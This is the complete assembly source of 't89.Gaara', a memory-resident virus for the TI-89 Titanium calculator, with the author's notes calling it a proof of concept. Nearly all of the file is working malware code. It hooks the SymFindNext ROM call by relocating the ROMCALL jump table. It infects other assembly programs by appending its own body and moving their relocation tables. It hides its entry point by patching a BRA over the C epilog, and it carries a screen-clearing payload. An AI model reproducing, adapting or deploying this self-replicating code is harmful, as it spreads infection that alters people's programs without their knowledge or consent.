; #www.piotrbania.com/all/ti89/ti89_gaara.asm#
;
;
;
;
;                                                       ллл                  
;                                                     лллллл                 
;                                                    ллллллл                 
;                                                   лл  лллл                 
;                                                       ллл                  
;                             лллллллллллллллллл        ллл                  
;                           ллллллллллллллллллллллллллллл                    
;                         ллллл          ллллллллллллллл                     
;                       лллл                  ллллллллл                   
;                     лллл                                                   
;                    лллл                                                    
;                   ллллллл                                                  
;                 лллллллл                                                   
;                лллллллл                                                    
;               лллллллл                                                     
;               лл ллллл                                       ллл           
;              ллл  ллл                                      лллл лл         
;              ллл ллл      ллл   лл   ллл        ллл      ллллллллл    ллл  
;             ллл лллллл   лллл   лл лллллл     лллллл    лллллллллл  лллллл 
;             ллл ллллл  лллллллллл ллллллл    ллллллл      лллл ллл ллллллл 
;             лллллллл  ллллллллл   ллл лллл   ллл лллл     лллллллл ллл лллл
;            лллллллл  лл   ллллл   лл  лллл   лл  лллл    ллллллл   лл  лллл
;            лллллллл      лллллл       лллл       лллл     лллл         лллл
;            ллллллл       ллллл        лллл       лллл     лллл         лллл
;            ллллллл       ллллл    ллллллл    ллллллл     лллл      ллллллл 
;            ллллллл       ллллл   ллл лллл   ллл лллл     лллл     ллл лллл 
;            лллллл  pb!   ллллл  лллл лллл  лллл лллл     лллл    лллл лллл 
;             лллл       лллллл  лллл лллл  лллл лллл     ллллл   лллл лллл  
;             лллллл   лллллллл  лллл лллл  лллл лллл     лллл    лллл лллл  
;              ллллллллллллллллл ллллллллл  ллллллллл     лллл    ллллллллл  
;           t89.ллллллл ллллл    ллллллллл  ллллллллл  ллллллл    ллллллллл  
;                                ллллллл    ллллллл               ллллллл    
;                                    лл         лл                    лл     
;
;					
;				    by Piotr Bania
;			      http://www.piotrbania.com
;
;
;  	лллллллллллллл
;  	л DISCLAIMER л
;  	лллллллллллллл
;
;	Author takes no responsibility for any actions with provided informations or 
;	codes. The copyright for any material created by the author is reserved. Any 
;	duplication of codes or texts provided here in electronic or printed 
;	publications is not permitted without the author's agreement.   
;
;
;
;
;  	лллллллллллллллл
;  	л AUTHOR NOTES л
;  	лллллллллллллллл
;
;
;	First of all this little piece of code was done _only_ for fun and as an
;       proof of concept code. When i was writting this thing, i thought it would 
;	be the first world's calculator virus, but one guy contacted me and it 
; 	seems it is the second one. Although it seems it is still the FIRST WORLD'S
; 	resident/entry point obscuring calculator virus :) This code was written
;	in couple of days (each hour each day), it took me few hours to learn main
;	things about Motorolla 68K assembly. I wasnt reviewing the code for optimization
; 	purposes, so well it should be heavily unoptimized at all. Now lets take a 
;	look of Gaara briefing:
;
;	Name:		ti89/ti89i.Gaara
;	Tested on:	TI89 Titanium HW3 AMS 3.10; (maybe other calcs are also
;			suitable - dunno)
;	Size:		501 bytes
;	Features:
;	+ Memory Resident Virus
;	+ Entry Point Obscuring
;	+ No multiple infections
;	+ Repairs/Moves the host relocation table
;	+ Appends itself to end of file
;	+ Leaves the marker
;	+ Payload	
;
;
;	ллллллллллллл
;       л Residency л
;	ллллллллллллл
;
;	When i was coding this little thingie i thought it would be fun
; 	if i could make this one resident. There are two main ways of making
;	the code resident here. Lets assume we want to take over some ROMCALL.
;	This could be done in two scenarios:
;	1) change the ROMCALL jump table offset and then change the offset
;	   of specific ROMCALL
;
;	2) modify the offset of specific ROMCALL
;
;       Of course as for first look, the second one looks more easier and effective.
;	But the problem is the ROMCALL jump table resides in FlashROM which is write-
;	-protected (there exist some protection scheme, which disables the writting
;	to this memory region). Although as i showed in the other document 
;	"flashrom_protection.asm" this protection can be disabled anyway. Of course
;	the next bad thing about this method is that you can't just simply write to FlashROM
;	etc. etc. But the main reason i have choosen the first method is "stability" itself.
;	The first method bad point is that it needs to allocate enough memory to handle
;	all the ROMCALL offsets so its about ~6200 bytes of additonal heap memory which
;	we need to reserve.  
;
;	Our infection procedure, is executed when any program tries to execute
;	SymFindNext function, via using the ROMCALL jump table offsets. The SymFindNext
;	function finds the next symbol entry in the VAT table, if found symbol is
;	infectable the virus proceeds with the infection process.
;
;
;
;	ллллллллллллллллллллллллл
;	л Entry Point Obscuring л
;	ллллллллллллллллллллллллл
;
;	Well the idea behind this idea is not to execute the virus directly
;	from the entrypoint of the host. So here's the main idea about this one.
;	It seems that TI-GCC generates a const EPILOG (just like mov esp,ebp/pop ebp/ret
;	by C compilers on the x86 platforms.)
;
;	Here's the EPILOG looks as follows:
;	
;	----------------------------------
; 	unlk    a6		 :  4E 5e
; 	rts		         :  4E 75
;	----------------------------------
;
;	As you can see, we have 4 bytes here, which means it is enough to
;	make some BRA/BSR execution flow - so that's what suits us.
;	I have decided to use BRA here, since it doesn't mess with the stack
;	and we are able to return directly to the host by executing the overwritten
;	instructions.
;
;	Well, here the first EPILOG found will be overwritten, and if its not found
;	the virus will not execute at all. Anyway this process can be more extened
;	for example the found EPILOG can be overwritted based on some random numbers.
;	Moreover you can even make your own disassembler and then you are free to
;	change any suitable instruction you want, but even if we consider the size
;	of this thing i have better things to do then writting it :)
;
;
;
;	ллллллллллл
;	л Payload л
;	ллллллллллл
;
;	If the random number obtained from the programmable timer
;	is equal to 77h, it will clear the calculator screen and
;	display "t89.Gaara" string. 
;
;
;
;	лллллллллллллл
;	л Last words л
;	лллллллллллллл
;
;	I hope you learnt something by reviewing this code. Of course
;	the dectection of this one should be pretty easy since even though
;	it uses some basic EPO, the body of the virus is constans, and it 
;	leaves the standalone marker, so its damn easy recognizable. 
;	Who knows maybe i left it specially :)
;	
;	So it seems that's all, and now for you all i will sing some
;	song from my beloved Naruto series :)
;
;	...
;	dakara daiji na mono wa itsumo
;	katachi no nai mono dake
;	te ni iretemo nakushitemo 
;	kizukanumama
;
;	sousa kanashimi wo yasashisa ni
;	jibun rashisa wo chikara ni
;	kiminara kitto yareru shinjite ite
;	mou ikkai  mou ikkai
;	mou ikkai  mou iikai?
;	
;
;	
;	ENDOFTRANSSMISION-NO-JUTSU!
; 
;
;
; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл


	
	xdef	_ti89
	xdef	_main
	xdef	_nostub
	include "os.h"
	
	
	
	; -----------------------------------------
	; little modified ROM_CALL macro
	; Args:
	; 2 - ROM FUNCTION
	; 1 - rom jump table base
	; Note: a0 is modified anyway
	; -----------------------------------------
ROMC	MACRO
	move.l	\2*4(\1),a0
	jsr	(a0)
	ENDM	
	
	
ZEROCMP	MACRO
	move.l	a5,d0
	tst.l	d0
	beq	\1
	ENDM


ASM_TAG			equ	$F3
ROMC_TABLE_SIZE		equ	$1838			; ROM CALL jump table size (~)


SYM_ENTRY.name 		equ 	0
SYM_ENTRY.compat 	equ 	8
SYM_ENTRY.flags 	equ 	10
SYM_ENTRY.hVal 		equ 	12
SYM_ENTRY.sizeof 	equ 	14


	

_main:	
	nop				; pad
	nop
	
	movem.l	a0-a6/d0-d7,-(a7)	; pushad
	move.l  $C8,a4			; a4 = ROMCALL jump table
	
	bsr 	installation_check	; are we already installed?
	tst.l	d0
	beq	check_payload
		
	bsr	hook_the_callz
		
check_payload:		
	; is it payload time? (uses the programmable timer data)
	move.b  $600017,d0		
	cmp.b	#$77,d0
	beq	payload
	
	

exit:	
	; is it the first generation?
	lea 	first_gen(PC),a1
	tst.b	(a1)
	bne	first_genx

	movem.l (a7)+,a0-a6/d0-d7	 ; restore the registers
	unlk    a6			 ; face it boo, till your face get blue!
	rts

	
first_genx:	
 	movem.l (a7)+,a0-a6/d0-d7	 ; restore the registers
 	rts
		
payload:				 ; notice the user Gaara is here
	ROMC	a4,ClrScr
	move.w	#1,-(a7)	
	lea	marker(PC),a1
	move.l	a1,-(a7)		
	clr.w	-(a7)
	move.w	#55,-(a7)
	ROMC	a4,DrawStr
	add	#10,a7
	bra	exit


	; ------------------------------------------------------------
	; INSTALLATION_CHECK
	; ------------------------------------------------------------
	; Functions checks if we are already resident.
	; ------------------------------------------------------------
	; ON ENTRY:
	; * a4 - ROMCALL jump table
	; ON EXIT:
	; * d0 = 0 if already installed
	; ------------------------------------------------------------
	
installation_check:
	move.l	$C8,d0
	and.l	#$E00000,d0
	rts



	; ------------------------------------------------------------
	; HOOK_THE_CALLZ
	; ------------------------------------------------------------
	; Well first of all i was thinking about modifing the original
	; AMS on the fly. Of course this is not an easy task since the
	; AMS resides inside of FLASHROM, which is write-protected.
	; Anyway here's another method i found. It is based on relocating
	; the ROMCALL jump table ptr, it seems it is an easy task but 
	; the main limitation is that it requires about 6200 bytes of
	; free space for storing the original ROMCALL jump table there.
	; -------------------------------------------------------------
	; ON ENTRY:
	; * a4 - ROMCALL jump table ptr
	; -------------------------------------------------------------
	; ON EXIT:
	; * a5 -  (0 if fucked)
	; -------------------------------------------------------------

hook_the_callz:		
	; store the old ptrs
	lea 	old_SymFindNext(PC),a0
	move.l	SymFindNext*4(a4),(a0)
		
	; make a clean copy of ROMCALL table
	move.l	#ROMC_TABLE_SIZE,d7
	move.l	a4,a2
	bsr	create_mem_region
	ZEROCMP	hook_error
	move.l	a5,a6			; a6 = new ROMCALL table
	
	move.l	#end_gaara-_main,d7
	lea	_main(PC),a2
	bsr 	create_mem_region
	ZEROCMP	hook_error
					; a5 = virus body // new SymFindNext
	
	; modify the SymFindNext address
	add.l	#hook_SymFindNext-_main,a5
	move.l	a5,SymFindNext*4(a6)
	
	; modify the ROMCALL jump table ptr
	bclr.b	#2,$600001
	move.l	a6,$C8
	bset	#2,$600001
		
	
hook_done:
	rts	
	

hook_error:
	sub.l	a5,a5
	rts
	
	

	; ------------------------------------------------------------
	; CREATE_MEM_REGION
	; ------------------------------------------------------------
	; Allocates a heap region for hooking procedures and copies
	; the hooking procedure there.
	; ------------------------------------------------------------
	; ON ENTRY:
	; * a4 - ROMCALL jump table ptr
	; * d7 - size to allocate
	; * a2 - src
	; ON EXIT:
	; * a5 - heap memory block ptr (0 if block is fucked)
	; ------------------------------------------------------------
create_mem_region:
	move.l	d7,-(a7)
	ROMC	a4,HeapAllocHigh
	addq	#4,a7
	tst.w	d0
	beq	no_mem
	move.w	d0,-(a7)
	ROMC	a4,HeapDeref		; get the heap block ptr (warning: this may return garbage if the handle is zero
					; so take care of d0 from HeapAllocHigh
	addq	#2,a7													
	move.l	a0,a5			; a5 = a0 = heap block ptr
	
copy_mem:
	move.b	(a2)+,(a0)+
	dbf	d7,copy_mem
	
create_mem_ret:
	rts
		
no_mem:
	sub.l	a5,a5
	rts
		

	; ------------------------------------------------------------
	; hook_SymFindNext
	; ------------------------------------------------------------
	; The body of hooked SymFindNext
	; ------------------------------------------------------------
hook_SymFindNext:

	; firstly execute the orginal one to obtain SYM_ENTRY struct	
	move.l	old_SymFindNext(PC),a0
	jsr	(a0)
	
	
	movem.l	a0-a6/d0-d7,-(a7)	; pushad
	move.l  $C8,a4			; a4 = ROMCALL jump table

					; here: a0 - ptr to SYM_ENTRY struct
	move.l	SYM_ENTRY.flags(a0),d0	; d0 = sym_entry flags
	andi.w	#$06C8,d0		; ~SF_ARCHIVED | SF_TWIN | SF_FOLDER | SF_OVERWRITTEN | SF_LOCKED
	bne	back2caller

	clr.l	d6
	move.w	SYM_ENTRY.hVal(a0),d6   ; store handle for later use (d6)
	
;	move.w	d6,-(a7)
;	ROMC	a4,HeapUnlock
;	addq	#2,a7
;	tst.w	d0
;	beq	back2caller
			
	move.w	d6,-(a7); target handle
	ROMC	a4,HeapDeref		; get the heap block ptr 	
	addq	#2,a7	
					; a0 = heap block ptr (the victim entrypoint offset 0x56)	
	sub.l	d5,d5
	move.w	(a0),d5			; d4 = asm program size not including the size-word
	move.l	d5,d2
	move.l	a0,a2
	
	; lets check if the file is already infected
	; sweet EVEN motorolla blee
	
scan_file:
	cmp.b	#$47,(a2)+		; 'G'?
	bne	scan_run
	cmp.b	#$41,(a2)		; 'A'?
	bne	scan_run
	addq.l	#1,a2
	cmp.b	#$41,(a2)		; 'A'?
	beq	back2caller
	sub.l	#1,a2

scan_run:
	dbf	d2,scan_file		
	
	lea 	1(a0,d5.l),a3		; a3 = ptr to end of file
	cmp.b	#ASM_TAG,(a3)		; is this an ASM proggie? (although it seems pure ASM programs
					; do not have this marker at all :) *grin*
	bne	back2caller		; nope, return
	
	; ------------------------------------------------------------
	; at this point if the heap relocation stuff will not cause any problems
	; file should be infected
	;
	; Summary:
	; * a3 - ptr to end of file
	; * a0 - ptr to begining of the file
	; * d6 - handle
	; * d5 - program size (not including the size word)
	; ------------------------------------------------------------
		
	move.l	d5,d7
	add.w	#end_gaara-_main,d7
	addq.w	#2,d7			; + variablesize entry
	
	cmp.w	d7,d5			; oops size overflow
	bgt	back2caller
	
		
	move.l	d7,-(a7)
	move.w	d6,-(a7)
	ROMC	a4,HeapRealloc		; realloc the block		
	addq	#6,a7
	tst.w	d0			
	beq 	back2caller		; reallocation failed :(
	
	move.w	d0,-(a7)
	ROMC	a4,HeapDeref		; get the heap block ptr 
	addq	#2,a7



	; now a0 = ptr to rellocated block
	move.l	a0,a3			; a0 = a3 = new file heap block
	subq.w	#2,d7			; without the "variablesize"
	move.w	d7,(a0)+		; update the size entry (host_size+virus_size)
			
	lea	1(a0,d5.l),a1		; now a1 = end of old file (ASM_TAG)	
	add.l	d7,a0			; a0 = end of heap block
	
	move.b	#ASM_TAG,-(a0) 		; store the ASM_TAG
	subq.l	#2,a1
	move.l	a1,a5
	
	; now we should take care of the damn relocations - the idea is to move 
	; the relocation table to the end of the heap block, so it will be now placed 
	; after the virus code, and it will still work. The relocation tables comes
	; before the ASM_TAG and it ends with two zero bytes. 
	; 
	; Why there are only byte-requests (instead of move.w/move.l bla bla)?
	; on 68k an word or long-word access to an odd address causes Address Error
	; - stay cool man.



process_relocs:	
	tst.b	-(a5)
	bne	relocs_go
	tst.b	-(a5)
	beq	done_relocs	
	addq.l	#1,a5
relocs_go:
	subq.l	#1,a5
	move.b	-(a1),-(a0)
	move.b	-(a1),-(a0)		
	bra	process_relocs		; continue until the next word is not null

done_relocs:	
	move.b	#00,-(a0)		; end of relocations
	move.b	#00,-(a0)

	lea	first_gen(PC),a2	; this is no longer first gen
	move.b	#0,(a2)	

	
	subq.l	#2,a1			; a1 = end of the old file body without the relocations
	move.l	a1,a2			; this is also begining of our carrier
					; copy Sabaku no Gaara there.				
	lea	_main(PC),a4
	move.l	#end_gaara-_main,d3	

sabaku_soso:
	move.b	(a4)+,(a1)+
	dbf	d3,sabaku_soso
	
		
	; ------------------------------------------------------------
	; Time for little EPO:
	; 
	; It seems this is the EPILOG for C proggies compiled with TIGCC
	; EPILOG:
	; unlk    a6		; - 4E 5e
	; rts		        ; - 4E 75
	;
	; so we have 4 bytes we could potencialy overwrite with a
	; non-conditional "jump", with bra or bsr :) Generally
	; bra should be enough, since it doesnt mess with the stack
	; and moreover we are able to flow back by "running" the orignal
	; instructions "in buffer."
	; ------------------------------------------------------------
	; At this point: 
	; * a3 - heap block ptr
	; * d5 - old file size 
	; * a2 - ptr to virus body
	; ------------------------------------------------------------
	
	addq.l	#2,a3			; pass the variable_size

scan_for_epilog:			; crazy makin' freaky sound.
	cmp.b	#$4e,(a3)+
	bne	repeat_scan
	cmp.b	#$5e,(a3)
	bne	repeat_scan
	addq.l	#2,a3
	cmp.b	#$75,(a3)
	beq	found_epilog
	subq.l	#2,a3
	
repeat_scan:
	dbf	d5,scan_for_epilog
	bra	back2caller		; no epilog, no virus execution :(
	
	
found_epilog:
	sub.l	#3,a3			; a3 = place with epilog
	sub.l	a3,a2
	subq.w	#2,a2			; offset to jump
	
	move.b	#$60,(a3)+		; store BRA
	move.b	#00,(a3)+
	move.w	a2,(a3)


back2caller:
	movem.l (a7)+,a0-a6/d0-d7	; popad
	rts


		
;hook_SymFindNext_orginal:
			;dc.b	$4E,$F9		; hardcoded 68k jump
			
old_SymFindNext		dc.l	0	
hook_SymFindNext_end	dc.w	0
first_gen		dc.b	1

marker			dc.b	"t89.GAARA  "	; marker
end_gaara:		dc.w	0


end:	